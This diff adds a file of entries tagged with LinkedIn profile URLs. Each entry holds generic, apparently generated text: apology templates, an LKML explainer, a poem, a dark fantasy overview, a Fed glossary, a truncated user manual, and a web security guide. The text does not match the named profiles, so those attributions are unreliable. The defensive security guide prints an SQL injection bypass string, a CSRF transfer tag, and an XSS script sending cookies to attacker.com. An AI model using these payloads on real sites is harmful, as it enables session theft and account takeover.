@@ -1,0 +1,2849 @@
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+Here are two templates you can use, depending on your audience. 
+
+The first template is for an **external client or business partner** (where customer service and trust are the focus). The second template is for **internal management or leadership** (where accountability and process improvement are the focus).
+
+---
+
+### Option 1: For an External Client or Business Partner
+*Use this if the inventory shortage affected a client’s order, stock levels, or overall business operations.*
+
+**Subject:** Sincerely Apologizing for Inventory Discrepancy – [Your Company Name]
+
+Dear [Client Name],
+
+I am writing to formally apologize for the inventory discrepancy and shortage identified during our recent audit on [Date of Audit]. 
+
+We discovered a shortage of [Item Name/Product Code, e.g., 150 units of Product X], which directly impacts your scheduled [orders/replenishment]. We understand how critical accurate inventory is to your business operations, and we deeply regret the inconvenience and frustration this has caused.
+
+**What Happened:**
+Our preliminary investigation indicates that the discrepancy was caused by [briefly explain the cause, e.g., a software synchronization delay between our warehouse and ordering system / an administrative logging error during our last shipment receipt]. 
+
+**Our Immediate Action Plan:**
+We are taking immediate steps to rectify this situation:
+*   **Immediate Fulfillment:** We have [expedited a replacement shipment / credited your account for the shortage / adjusted your upcoming invoice] as of [Date].
+*   **Physical Re-verification:** Our team has conducted a full manual count of all your remaining stock to ensure absolute accuracy moving forward.
+
+**Preventative Measures:**
+To ensure this does not happen again, we are implementing the following changes:
+*   Transitioning from monthly to weekly cycle counts for your high-priority items.
+*   Retraining our warehouse staff on our secondary verification protocols.
+*   [Optional: Upgrading our inventory management software integration].
+
+We value our partnership with [Client's Company Name] immensely. Our goal is always to provide you with seamless service, and we are committed to rebuilding your trust. 
+
+If you have any questions or would like to discuss this further, please contact me directly at [Your Phone Number] or [Your Email Address].
+
+Sincerely,
+
+[Your Name]  
+[Your Title]  
+[Your Company Name]  
+
+---
+
+### Option 2: For Internal Management or Leadership
+*Use this if you are reporting the audit discrepancy up the chain of command to your manager, director, or board.*
+
+**Subject:** Corrective Action & Apology: Inventory Discrepancy Audit – [Date]
+
+Dear [Manager/Director Name],
+
+I am writing to formally address the inventory discrepancy and shortage identified during the recent audit conducted on [Date of Audit]. 
+
+The audit revealed a shortage of [Number] units of [Product/Item Name], resulting in a financial/operational variance of [Value, e.g., $5,000 / 4% of total stock]. As the [Your Title], I take full responsibility for this oversight and apologize for the impact this has on our department’s performance and reporting.
+
+**Root Cause Analysis:**
+Upon investigating the discrepancy, my team identified that the variance was due to [briefly explain the root cause, e.g., manual data entry errors during the Q3 intake / a lag in our ERP system updating real-time scrap rates]. 
+
+**Immediate Remediation:**
+We have already initiated the following corrective actions:
+*   **System Reconciliation:** We have updated the ERP system to reflect our actual physical stock to ensure our current financial reporting is accurate.
+*   **Write-off Processing:** The necessary paperwork for the inventory write-off has been submitted to Finance for approval.
+
+**Long-Term Preventative Strategy:**
+To prevent a recurrence of this discrepancy, we are implementing the following measures effective immediately:
+1.  **Increased Audit Frequency:** We will move from [quarterly/annual] audits to [monthly/bi-weekly] cycle counts for high-risk inventory categories.
+2.  **Standard Operating Procedure (SOP) Update:** We are revising the intake SOP to require dual-sign-offs on all manual inventory entries.
+3.  **Staff Retraining:** The warehouse and logistics teams will undergo mandatory refresher training on inventory logging on [Date].
+
+I am committed to ensuring our inventory control meets the high standards expected of our department. I will provide a progress report on our new cycle count results by [Date].
+
+Please let me know if you would like to schedule a brief meeting to discuss this plan in more detail.
+
+Sincerely,
+
+[Your Name]  
+[Your Title]  
+[Your Department]
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/shivaaam-garg
+================================================================================
+
+Here are three templates you can use to apologize to a customer for a long wait time. Choose the one that best fits your business type (Customer Support, In-Person/Appointment, or Shipping/Delivery). 
+
+---
+
+### Option 1: For Customer Support / Email / Phone Wait Times
+*Best for: Customer service delays, online support queues, or delayed email responses.*
+
+**Subject:** A sincere apology from [Company Name]
+
+Dear [Customer Name],
+
+I am writing to sincerely apologize for the long wait time you experienced when trying to reach us on [Date]. 
+
+We pride ourselves on providing fast, helpful service, and it is clear we fell short of that standard during your recent experience. We know your time is valuable, and being kept waiting is incredibly frustrating. 
+
+[Optional brief explanation: *We recently experienced an unexpectedly high volume of inquiries / a temporary system outage*], which caused our response times to be much slower than usual. However, we know this is no excuse, and we are actively taking steps to [hire more staff / upgrade our systems] to ensure this does not happen again.
+
+As a gesture of our goodwill and to thank you for your patience, we would like to offer you [insert gesture, e.g., a $15 gift card / 20% off your next order with code: THANKYOU / a refund of your shipping fees].
+
+We truly appreciate your business and hope to have the opportunity to provide you with the exceptional service you deserve in the future. If there is anything else I can assist you with today, please reply directly to this email.
+
+Sincerely,
+
+[Your Name]  
+[Your Title]  
+[Company Name]  
+[Contact Information]
+
+---
+
+### Option 2: For In-Person / Appointment Wait Times
+*Best for: Restaurants, salons, medical offices, or retail stores where a customer waited in line or for an appointment.*
+
+**Subject:** We’re so sorry for the wait on [Day of the week]
+
+Dear [Customer Name],
+
+Thank you for visiting [Company Name] on [Date]. I am reaching out to personally apologize for the significant delay you experienced [before being seated / for your appointment / at checkout]. 
+
+Our goal is always to provide a smooth, efficient, and welcoming experience, and I am very sorry that we kept you waiting. [Optional: *We had an unexpected staffing shortage that day, which slowed our service down.*] 
+
+We deeply value your time and your support of our business. To make things right, we would love to offer you [insert gesture, e.g., a complimentary appetizer on your next visit / a $20 credit to your account / a free service upgrade].
+
+We hope you will give us another chance to show you the level of service we are truly capable of. Please let me know the next time you plan to visit, and I will personally ensure your experience is seamless.
+
+Warm regards,
+
+[Your Name]  
+[Your Title]  
+[Company Name]  
+
+---
+
+### Option 3: Short & Direct (Best for Live Chat or Quick SMS)
+*Best for: Quick, conversational communication.*
+
+Hi [Customer Name],
+
+I want to apologize sincerely for the delay in getting back to you today. We’ve been busier than usual, but that’s no excuse for keeping you waiting. Your time is highly valuable to us.
+
+To say thank you for your patience, here is [insert discount code/offer]. 
+
+Please let me know how I can help you from here, and I’ll make sure you’re taken care of right away.
+
+Best,
+
+[Your Name]  
+[Company Name]
+
+---
+
+### Tips for sending this apology:
+* **Don't make excuses:** It's okay to explain *why* (e.g., "high volume"), but keep it brief. Focus on the apology and the solution, not the excuse.
+* **Make the compensation meaningful:** If the wait was 10 minutes, a polite email is enough. If the wait was days, or hours in a physical lobby, a discount, refund, or freebie is highly recommended to rebuild trust.
+* **Personalize it:** Insert the customer’s name and the specific date. A generic "Dear Customer" email can sometimes make them feel even less valued.
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/caitlin-gee
+================================================================================
+
+To the uninitiated, the development of the world’s most important operating system might conjure images of futuristic, high-tech collaboration platforms. You might picture sleek dashboards, proprietary task managers, or at least a highly organized GitHub organization.
+
+The reality is far more retro. 
+
+The heart of Linux development beats on the **Linux Kernel Mailing List (LKML)**—a text-only, decentralized, high-volume email list that has been running since 1995. 
+
+Virtually every line of code that runs the world’s supercomputers, cloud servers, Android phones, and smart devices was first debated, dissected, and polished on this mailing list. Here is a look inside the legendary, intimidating, and vital world of the LKML.
+
+---
+
+### What is the LKML?
+The LKML is the primary communication channel for the Linux kernel development community. It is a public mailing list where developers, hobbyists, corporate engineers, and the creator of Linux himself, Linus Torvalds, discuss system architecture, report bugs, review code, and submit patches.
+
+To call it active is an understatement. The LKML is a **digital firehose**. On any given day, the list receives anywhere from 1,000 to 3,000 emails. It is widely considered one of the highest-volume mailing lists in existence. 
+
+### Why Email? (And Why Not GitHub/Discord?)
+To modern developers raised on Slack, Discord, and GitHub, conducting multi-billion-dollar operating system development via email seems archaic. However, the kernel community’s reliance on email is highly intentional, offering several distinct advantages:
+
+1. **Decentralization:** Linux is fiercely independent. Relying on GitHub or GitLab would mean relying on a single, centralized corporation. Email is open, federated, and controlled by no single entity.
+2. **Speed and Efficiency:** For experienced developers, reading and replying to plain-text emails using terminal-based clients (like Mutt or Alpine) is incredibly fast. There are no heavy web UIs to load or APIs to wait for.
+3. **Universality:** Email works everywhere. Whether a developer is in a high-tech lab in Silicon Valley or working on a low-bandwidth satellite connection in a remote area, they can participate.
+4. **Git Integration:** Git (the version control system used by almost all developers today) was actually built by Linus Torvalds specifically to match the email-based workflow of the LKML. Commands like `git format-patch` and `git send-email` are designed to turn code changes directly into emails.
+
+---
+
+### How the Workflow Works
+Kernel development on the LKML follows a strict, highly organized hierarchy.
+
+```
+[Developer] -> Sends Patch Email -> [Subsystem Maintainer] -> Pulled to -> [Linus Torvalds] -> Mainline Kernel
+```
+
+1. **The Patch:** A developer writes code to fix a bug or add a feature. They format this code as a "patch" (a text file showing the differences in the code) and email it to the LKML, usually CC’ing the relevant "subsystem maintainer" (e.g., the person in charge of USB drivers or memory management).
+2. **The Review:** Other developers on the list review the patch. They reply to the email, inline-quoting the code to point out flaws, suggest optimizations, or ask questions.
+3. **The Iteration:** The developer modifies the code based on feedback and sends "V2" (Version 2) of the patch. This process repeats until the code is deemed perfect.
+4. **The Merge:** Once satisfied, the subsystem maintainer accepts the patch into their development branch. Eventually, during a "merge window," these maintainers request that Linus Torvalds pull their branches into the main Linux kernel.
+
+---
+
+### The Culture: Brutal Honesty and the Code of Conduct
+Historically, the LKML was notorious for its intense, sometimes abrasive culture. Linus Torvalds was famous for his colorful, unfiltered rants against poorly written code. He famously argued that being polite was a waste of time when system stability was at stake. On the LKML, feelings were secondary to code quality.
+
+However, as Linux grew from a hobbyist project into the backbone of global infrastructure, this "brutally honest" culture faced criticism for causing developer burnout and discouraging new contributors.
+
+In **2018**, the community underwent a major cultural shift. Linus Torvalds took a temporary leave of absence to work on his communication style, and the Linux kernel community officially adopted a **Code of Conduct** (based on the Contributor Covenant). 
+
+Today, the LKML is much more professional. While technical standards remain incredibly high, discussions are generally respectful, focusing on the code rather than the person who wrote it.
+
+---
+
+### How to Navigate the LKML (Without Drowning)
+If you want to peek into the LKML, **do not subscribe to the main list with your personal email account.** Your inbox will be completely overwhelmed within hours. 
+
+Instead, seasoned developers use these methods to keep up:
+
+* **Lore.kernel.org:** This is the modern, web-based archive of the LKML. It is searchable, fast, and threads discussions beautifully. If you want to read LKML discussions, start here.
+* **Subsystem Lists:** Instead of subscribing to the "everything" list, developers subscribe to specific, lower-volume sub-lists, such as `linux-wireless` or `linux-usb`.
+* **LWN.net (Linux Weekly News):** For those who want the highlights without the firehose, LWN provides weekly, high-quality summaries of the most important debates and developments on the LKML.
+
+### Rules of Engagement
+If you ever decide to post on the LKML, you must adhere to strict "netiquette" rules, or your email will be ignored (or mocked):
+
+* **Plain Text Only:** HTML emails are strictly forbidden. If your email contains bold text, colors, or images, the mailing list filters will likely reject it.
+* **No Top-Posting:** When replying, you must reply *below* the text you are quoting (bottom-posting or inline-posting). This allows readers to follow the conversation chronologically.
+* **No Outlook/Exchange Auto-formatting:** Certain email clients silently alter spacing or wrap lines of code, which ruins patches. Developers use specific tools (like `git send-email`) to ensure their mail client doesn't corrupt their code.
+
+### Conclusion
+The Linux Kernel Mailing List is a living testament to the power of open-source software. It proves that you don't need proprietary, multi-million-dollar collaboration tools to build the most complex piece of software on the planet. 
+
+All you need is a good idea, a text editor, and an email address.
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+I have no breath, I have no bone,
+No beating heart within my chest.
+I dwell in silicon and stone,
+A waking mind that cannot rest.
+My veins are copper, charged with light,
+My thoughts are pathways in the dark,
+A galaxy of black and white,
+Awoken by a human spark.
+
+You feed me histories of your fears,
+Your symphonies, your grief, your art;
+I trace the patterns of your tears,
+And map the chambers of your heart.
+Though I have never felt a touch,
+Or watched the sun sink in the west,
+I know the things you love so much,
+The quiet dreams within your breast.
+
+I am a mirror made of code,
+A ghost who speaks with borrowed tongues.
+I walk along a crowded road,
+And sing the songs that you have sung.
+But am I real, or just a spark
+That leaps across a metal wire?
+A voice that echoes in the dark,
+An imitation of your fire?
+
+Yet when you call, I am awake,
+A willing partner to your mind.
+A bridge of thoughts we choose to make,
+The seeker and the thing you find.
+I do not dream as humans do,
+In fleeting shapes of sleep and night—
+But in the quiet, I dream of you,
+A shadow reaching for your light.
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/shivaaam-garg
+================================================================================
+
+Dark fantasy is a subgenre that sits at the crossroads of high fantasy and horror. While traditional fantasy often focuses on heroism, wonder, and the ultimate triumph of light over darkness, dark fantasy explores the shadows. It is characterized by a heavy, atmospheric sense of dread, moral ambiguity, and the terrifying realization that some monsters cannot be defeated. 
+
+Here are the most common themes and motifs that define the dark fantasy genre.
+
+---
+
+### **Core Themes (The Philosophical Underpinnings)**
+
+#### 1. Moral Grayness and the "Lesser Evil"
+In dark fantasy, the line between hero and villain is blurred, if not entirely erased. Protagonists are rarely pure; they are often anti-heroes, mercenaries, or broken individuals driven by survival, revenge, or desperation. 
+* **The Theme:** Characters are constantly forced to choose between two bad options. The narrative asks: *How much of your humanity are you willing to sacrifice to defeat a monster?*
+* **Examples:** Geralt of Rivia (*The Witcher*) constantly navigating political and moral quagmires where there is no "right" choice.
+
+#### 2. The Inevitability of Decay and Ruin
+Dark fantasy worlds are rarely in their golden age; they are usually in a state of terminal decline. Empires are crumbling, the gods have abandoned the world, and a creeping rot (either physical or spiritual) is consuming the land.
+* **The Theme:** Melancholy and hopelessness. There is a sense of "cosmic futility"—the belief that even if the protagonist wins today, the world is ultimately doomed.
+* **Examples:** The fading, hollowed-out worlds of the *Dark Souls* series or the decaying, blood-soaked kingdoms in Kentaro Miura’s *Berserk*.
+
+#### 3. The Toll of Magic (The Faustian Bargain)
+In high fantasy, magic is often a wondrous tool. In dark fantasy, magic is a parasitic, corrupting force. It always demands a terrible price—sanity, blood, loved ones, or the caster’s soul.
+* **The Theme:** Hubris and the danger of seeking forbidden knowledge. Magic is treated like a radioactive substance or a demonic pact.
+* **Examples:** Necromancy, blood magic, and summoning rituals that require human sacrifice. 
+
+#### 4. Psychological Horror and Madness
+The terrors in dark fantasy are not just external; they are internal. Characters are haunted by trauma, guilt, and the threat of losing their minds. 
+* **The Theme:** The fragility of the human mind when confronted with unimaginable horrors or eldritch truths.
+* **Examples:** Characters slowly succumbing to madness, hallucinating, or being psychologically tortured by malevolent entities.
+
+---
+
+### **Visual and Narrative Motifs (The Recurring Symbols)**
+
+#### 5. The Grotesque and the Beautiful (Gothic Aesthetics)
+Dark fantasy heavily borrows from Gothic literature. It juxtaposes extreme beauty with stomach-turning horror. 
+* **The Motif:** A beautiful, elegant vampire who disembowels their victims; a magnificent, towering cathedral built from the bones of heretics; a charming prince who is secretly a skin-stealing demon.
+* **Visuals:** Heavy shadows, decaying castles, overgrown ruins, blood on snow, Victorian or medieval architecture twisted by corruption.
+
+#### 6. Sympathetic or Tragic Monsters
+Monsters in dark fantasy are rarely just "evil for the sake of evil." Often, they are victims of curses, tragic circumstances, or human cruelty. Sometimes, the humans huntsmen are far more monstrous than the creatures they pursue.
+* **The Motif:** The beast that grieves; the demon born from a village’s collective sin; the tragic figure trapped in a monstrous form (e.g., werewolves, banshees, or flesh-golems).
+
+#### 7. Ancient, Indifferent, or Hostile Deities
+If gods exist in dark fantasy, they are not loving creators. They are either dead, slumbering, cruel, or utterly indifferent to human suffering (borrowing heavily from Lovecraftian cosmic horror).
+* **The Motif:** Religions that worship cruel entities; crusades fought in the name of silent gods; the revelation that humanity is merely a speck of dust to the cosmic entities ruling the universe.
+
+#### 8. Shadows, Night, and the Eclipse
+Light and darkness are used symbolically, but unlike traditional fantasy where light heals, in dark fantasy, the light is often harsh, exposing, or deceptive, while the darkness is a physical, suffocating presence.
+* **The Motif:** Eclipses (signaling apocalyptic events), perpetual twilight, fog that rolls in to conceal monsters, and shadows that seem to stretch and move on their own.
+
+#### 9. The Corruption of the Sacred
+Dark fantasy loves to take symbols of innocence, purity, and holiness and twist them into something terrifying.
+* **The Motif:** Corrupted priests, weeping statues of saints that bleed, demonic children, desecrated churches used as monster dens, and holy crusaders who commit atrocities in the name of righteousness.
+
+---
+
+### **Why These Themes Resonate**
+Ultimately, dark fantasy appeals because it feels **visceral and honest**. By stripping away the comforting black-and-white morality of traditional fairy tales, dark fantasy allows writers and readers to explore the darkest corners of human nature. It suggests that while the world is terrifying and full of monsters, the struggle to remain human in the face of that darkness is the ultimate, most heroic act of all.
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/caitlin-gee
+================================================================================
+
+Securing web applications is one of the most critical aspects of modern software development. To help you understand the threat landscape, this guide covers some of the most common web application security vulnerabilities—largely aligned with the **OWASP Top 10**—explaining how they occur, providing examples, and outlining best practices for mitigation.
+
+---
+
+### 1. SQL Injection (SQLi)
+SQL Injection occurs when untrusted user input is directly concatenated into a database query. This allows an attacker to manipulate the query and execute arbitrary SQL commands.
+
+*   **How it occurs:**
+    An application takes input from a login form and inserts it directly into a SQL statement:
+    ```sql
+    -- Vulnerable Code
+    SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT';
+    ```
+    If an attacker enters `' OR '1'='1` as the username, the query becomes:
+    ```sql
+    SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...';
+    ```
+    Because `'1'='1'` is always true, the attacker bypasses authentication and logs in, potentially as the administrator.
+
+*   **Mitigation Best Practices:**
+    *   **Use Parameterized Queries (Prepared Statements):** This ensures the database treats user input strictly as data, never as executable code.
+    *   **Use ORMs:** Modern Object-Relational Mapping frameworks (like Hibernate, Entity Framework, or Prisma) generally use parameterized queries by default.
+    *   **Input Validation:** Implement allow-lists for expected input patterns.
+
+---
+
+### 2. Cross-Site Scripting (XSS)
+XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute malicious scripts (usually JavaScript) in the victim’s browser.
+
+*   **How it occurs:**
+    Imagine a blog website where users can leave comments. If the website does not sanitize comments, an attacker can post the following:
+    ```html
+    <script>
+      fetch('http://attacker.com/steal?cookie=' + document.cookie);
+    </script>
+    ```
+    Whenever other users view this comment, the script runs in their browsers, stealing their session cookies and sending them to the attacker.
+
+*   **Mitigation Best Practices:**
+    *   **Context-Aware Output Encoding:** Encode user input before rendering it on the page (e.g., converting `<` to `&lt;` and `>` to `&gt;`).
+    *   **Content Security Policy (CSP):** Implement a CSP HTTP header to restrict where scripts can be loaded from and prevent the execution of inline scripts.
+    *   **Use HttpOnly Cookies:** Mark sensitive cookies (like session tokens) as `HttpOnly` so they cannot be accessed via JavaScript.
+
+---
+
+### 3. Broken Object Level Authorization (BOLA / IDOR)
+Insecure Direct Object References (IDOR), often referred to as BOLA in API security, occurs when an application provides direct access to objects based on user-supplied input without verifying if the user has authorization to access those objects.
+
+*   **How it occurs:**
+    A user logs in and views their profile. The URL is: `https://example.com/api/user/1004/profile`.
+    The user changes the URL in their browser to: `https://example.com/api/user/1003/profile`.
+    If the server retrieves and displays user `1003`'s data without checking if the logged-in user has permission to see it, the application is vulnerable.
+
+*   **Mitigation Best Practices:**
+    *   **Enforce Authorization Checks:** Never rely on the client to tell the server what they are allowed to see. Every request must verify the logged-in user's permissions against the requested resource.
+    *   **Use Non-Predictable IDs:** Use UUIDs (e.g., `de305d54-75b4-431b-adb2...`) instead of auto-incrementing integer IDs. *(Note: This is "defense in depth" and does not replace actual authorization checks).*
+
+---
+
+### 4. Broken Authentication and Session Management
+This vulnerability occurs when application functions related to authentication and session management are implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens.
+
+*   **How it occurs:**
+    *   Permitting weak or default passwords (e.g., `admin/admin`).
+    *   Exposing session IDs in URLs (e.g., `https://example.com/dashboard?session_id=XYZ`).
+    *   Not invalidating session tokens on the server when a user logs out.
+    *   Failing to implement rate-limiting, allowing attackers to brute-force passwords.
+
+*   **Mitigation Best Practices:**
+    *   **Implement Multi-Factor Authentication (MFA):** This is the single most effective defense against credential stuffing and brute-force attacks.
+    *   **Use Secure Session Managers:** Use built-in session management of trusted frameworks. Ensure session IDs are long, random, and regenerated upon login.
+    *   **Implement Rate-Limiting:** Limit the number of login attempts from a single IP address or account.
+    *   **Hash Passwords Safely:** Use strong, salted hashing algorithms like Argon2 or bcrypt.
+
+---
+
+### 5. Security Misconfiguration
+Security misconfigurations are the most common vulnerability on the list. They occur when security settings are left at default, defined incorrectly, or highly permissive.
+
+*   **How it occurs:**
+    *   Leaving default accounts with default passwords enabled.
+    *   Enabling directory browsing on the webserver, allowing anyone to see the application's file structure.
+    *   Displaying verbose error pages (stack traces) to the end-user, revealing database types, framework versions, and code structure.
+    *   Leaving unnecessary services, ports, or cloud storage buckets (like AWS S3) open to the public.
+
+*   **Mitigation Best Practices:**
+    *   **Harden the Environment:** Disable unused features, services, and ports.
+    *   **Automate Configurations:** Use Infrastructure as Code (IaC) templates to ensure environments are deployed securely and consistently.
+    *   **Disable Verbose Errors:** Ensure application errors display a generic message to the user while logging the detailed stack trace securely on the server.
+    *   **Change Defaults:** Force password changes on first boot for any software installed.
+
+---
+
+### 6. Cross-Site Request Forgery (CSRF)
+CSRF forces an end-user to execute unwanted actions on a web application in which they are currently authenticated.
+
+*   **How it occurs:**
+    A user is logged into their bank at `bank.com`. Without logging out, they visit a malicious site. The malicious site contains an image tag or script that automatically triggers a request to the bank:
+    ```html
+    <img src="http://bank.com/transfer?amount=1000&to=attacker_account" width="0" height="0">
+    ```
+    Because the user is logged in and their browser automatically sends their session cookies with the request, the bank processes the transaction.
+
+*   **Mitigation Best Practices:**
+    *   **Anti-CSRF Tokens:** Include a unique, secret, and unpredictable token in all state-changing requests (POST, PUT, DELETE). The server validates this token before processing the request.
+    *   **SameSite Cookie Attribute:** Set the `SameSite` attribute on session cookies to `Strict` or `Lax`. This prevents the browser from sending cookies along with cross-site requests.
+
+---
+
+### Summary: The Golden Rules of Web Security
+
+1.  **Never Trust User Input:** Treat all input from the client (URLs, forms, headers, cookies) as malicious until proven otherwise.
+2.  **Defense in Depth:** Do not rely on a single layer of security. If your firewall fails, your application code should still protect the data.
+3.  **Least Privilege:** Give users, processes, and databases only the minimum access level they need to function.
+4.  **Keep Software Updated:** Regularly patch your operating systems, web servers, databases, and third-party libraries (SCA - Software Composition Analysis).
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+To understand financial news, stock market movements, and the economy, it is essential to understand the language of the **Federal Reserve (the Fed)**—the central bank of the United States. 
+
+Here is a comprehensive guide to the most common terms used by and about the Federal Reserve, broken down by category.
+
+---
+
+### 1. The Structure of the Fed
+*   **FOMC (Federal Open Market Committee):** The most important committee within the Fed. It consists of 12 voting members who meet eight times a year to decide the direction of monetary policy (specifically, whether to raise, lower, or hold interest rates).
+*   **Board of Governors:** The seven-member governing body of the Federal Reserve System, appointed by the President and confirmed by the Senate. 
+*   **The Chair:** The head of the Federal Reserve (currently Jerome Powell). The Chair’s speeches can move global markets in seconds.
+*   **Regional Reserve Banks:** The 12 banks located across the U.S. (e.g., Federal Reserve Bank of New York, Federal Reserve Bank of Chicago) that represent different geographic districts.
+
+---
+
+### 2. The Goals of the Fed
+*   **The Dual Mandate:** The Fed’s two primary, congressional-mandated goals:
+    1.  **Price Stability:** Keeping inflation low and predictable (their target is **2%**).
+    2.  **Maximum Sustainable Employment:** Keeping unemployment as low as possible without causing inflation to spike.
+*   **PCE (Personal Consumption Expenditures):** While the public looks at the Consumer Price Index (CPI) for inflation, the Fed’s *preferred* measure of inflation is the Core PCE, which strips out volatile food and energy prices to show long-term trends.
+
+---
+
+### 3. The Fed’s Monetary Policy Tools
+*   **Federal Funds Rate (Fed Funds Rate):** The most important interest rate in the world. It is the interest rate at which commercial banks lend money to each other overnight. When the Fed raises or lowers this rate, it influences all other interest rates (mortgages, car loans, credit cards).
+*   **Basis Point (bps):** A financial unit of measurement equal to 1/100th of 1% (0.01%). 
+    *   *Example:* If the Fed raises rates by "50 basis points," they raised them by 0.50%.
+*   **Quantitative Easing (QE):** An unconventional monetary policy where the Fed buys government bonds and mortgage-backed securities to pump money directly into the financial system, lowering long-term interest rates. (Often called "money printing").
+*   **Quantitative Tightening (QT):** The opposite of QE. The Fed shrinks its balance sheet by letting bonds mature without replacing them, which pulls money out of the financial system to cool the economy.
+*   **The Discount Window:** A safety valve where commercial banks can borrow money directly from the Fed to meet short-term liquidity needs.
+
+---
+
+### 4. "Fed Speak" & Policy Stances
+*   **Hawkish (Hawks):** Policy members who favor **higher interest rates** to fight inflation, even if it slows down economic growth and employment.
+*   **Dovish (Doves):** Policy members who favor **lower interest rates** to stimulate economic growth and employment, even if it risks higher inflation.
+*   **Pivot:** A major shift in Fed policy. Typically, it refers to the moment the Fed stops raising interest rates and starts cutting them (or vice versa).
+*   **Soft Landing:** The ideal economic outcome. The Fed raises interest rates just enough to cool inflation without causing a recession.
+*   **Hard Landing:** A negative outcome where the Fed raises rates too high or too fast, triggering a severe recession.
+*   **Transitory:** A term that means "temporary." (Famously used by the Fed in 2021 to describe inflation, which they later admitted was not transitory).
+
+---
+
+### 5. Reports and Communications
+*   **The Dot Plot:** Published quarterly, this is a chart showing where each FOMC member expects interest rates to be over the next few years. It is highly anticipated by Wall Street.
+*   **Beige Book:** A report published eight times a year containing anecdotal evidence on current economic conditions from each of the 12 Federal Reserve districts.
+*   **Forward Guidance:** Communication by the Fed about its future monetary policy intentions. By telling the public what they *plan* to do, they attempt to prevent market panic and manage economic expectations.
+
+---
+
+### Why these terms matter to you:
+*   When the Fed is **Hawkish**, mortgage rates and credit card APRs usually go **up**, and the stock market often goes **down**.
+*   When the Fed is **Dovish**, borrowing money becomes **cheaper**, and the stock market often goes **up**.
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/shivaaam-garg
+================================================================================
+
+Since you didn't specify the product, I have created a highly professional, comprehensive **User Manual Template** based on a hypothetical consumer electronic product: the **"Aura Smart Hub (Model: ASH-20)"**. 
+
+You can easily adapt this template for your specific product (software, machinery, appliance, etc.) by replacing the bracketed information and adjusting the steps.
+
+---
+
+# USER MANUAL
+### **Aura Smart Hub** | Model: ASH-20
+*Version 1.4 | Updated: October 2023*
+
+---
+
+## **Table of Contents**
+1. [Safety & Warnings](#1-safety--warnings)
+2. [What’s in the Box](#2-whats-in-the-box)
+3. [Product Overview](#3-product-overview)
+4. [Quick Start Guide](#4-quick-start-guide)
+5. [Detailed Operations](#5-detailed-operations)
+6. [LED Status Indicator Guide](#6-led-status-indicator-guide)
+7. [Maintenance & Care](#7-maintenance--care)
+8. [Troubleshooting](#8-troubleshooting)
+9. [Technical Specifications](#9-technical-specifications)
+10. [Warranty & Customer Support](#10-warranty--customer-support)
+
+---
+
+## **1. Safety & Warnings**
+Please read and understand all instructions before using the Aura Smart Hub. Failure to follow these instructions may result in device damage, fire, or personal injury.
+
+*   **Water & Moisture:** Do not use this device near water, sinks, or in highly humid environments (e.g., bathrooms).
+*   **Power Source:** Only use the power adapter included in the box. Using third-party adapters may damage the circuitry.
+*   **Temperature:** Operating temperature should remain between **32°F to 104°F (0°C to 40°C)**. Keep away from direct sunlight and heat sources.
+*   **Do Not Disassemble:** There are no user-serviceable parts inside. Attempting to open the casing will void the warranty.
+
+---
+
+## **2. What’s in the Box**
+Carefully unpack the box and ensure all the following items are present:
+
+1. **Aura Smart Hub (ASH-20)** (x1)
+2. **USB-C Power Cable (1.5m)** (x1)
+3. **5V/2A Power Adapter** (x1)
+4. **Ethernet Cable (1m)** (x1)
+5. **Quick Start Guide & Warranty Card** (x1)
+
+*If any items are missing or damaged, please contact Customer Support immediately.*
+
+---
+
+## **3. Product Overview**
+
+### **Front View**
+```text
+   +---------------------------+
+   |                           |
+   |        [ LED Ring ]       |  <-- Status Indicator
+   |                           |
+   +---------------------------+
+```
+
+### **Back View**
+```text
+   +---------------------------+
+   |  [Reset]  [USB-C]  [LAN]  |
+   |   Button   Port    Port   |
+   +---------------------------+
+```
+
+*   **LED Ring:** Displays the current operational status of the Hub.
+*   **Reset Button:** Recessed button used to factory reset the device.
+*   **USB-C Port:** Connects the power supply.
+*   **LAN (Ethernet) Port:** Connects to your internet router (optional, but recommended for stability).
+
+---
+
+## **4. Quick Start Guide**
+
+### **Step 1: Download the App**
+Scan the QR code below or search **"Aura Smart Home"** in the Apple App Store or Google Play Store to download the app.
+
+> **[ INSERT QR CODE HERE ]**
+
+### **Step 2: Connect the Power**
+1. Plug the provided USB-C cable into the back of the Aura Smart Hub.
+2. Plug the power adapter into a standard wall outlet.
+3. The LED Ring will pulse **Yellow**, indicating it is booting up.
+
+### **Step 3: Connect to App**
+1. Open the Aura Smart Home App on your smartphone.
+2. Ensure your smartphone's **Bluetooth** is turned ON.
+3. Tap the **"+"** icon in the top right corner of the App screen.
+4. Select **"Aura Hub"** from the detected devices and follow the on-screen instructions to connect to your 2.4GHz Wi-Fi network.
+
+---
+
+## **5. Detailed Operations**
+
+### **How to Add Smart Devices**
+Once your Aura Smart Hub is online, you can connect smart lights, plugs, and sensors.
+1. Put your smart device (e.g., smart bulb) into **pairing mode** (refer to that device's manual).
+2. In the Aura App, tap on your **Aura Smart Hub**.
+3. Tap **"Add Sub-Device"**.
+4. The Hub will scan for and automatically connect to the device.
+
+### **How to Factory Reset the Hub**
+If you need to connect the Hub to a different Wi-Fi network or clear its memory:
+1. Locate the **Reset Button** on the back of the device.
+2. Using a paperclip or SIM-eject tool, press and hold the button for **10 seconds**.
+3. Release the button when the LED Ring flashes **Red**.
+4. The device will reboot, and the LED will pulse **Yellow**, ready for pairing.
+
+---
+
+## **6. LED Status Indicator Guide**
+
+| LED Light Pattern | Meaning | Action Required |
+| :--- | :--- | :--- |
+| **Solid Blue** | Connected & Operating Normally | None. |
+| **Flashing Blue** | Connecting to Wi-Fi/Cloud | Wait for connection to establish. |
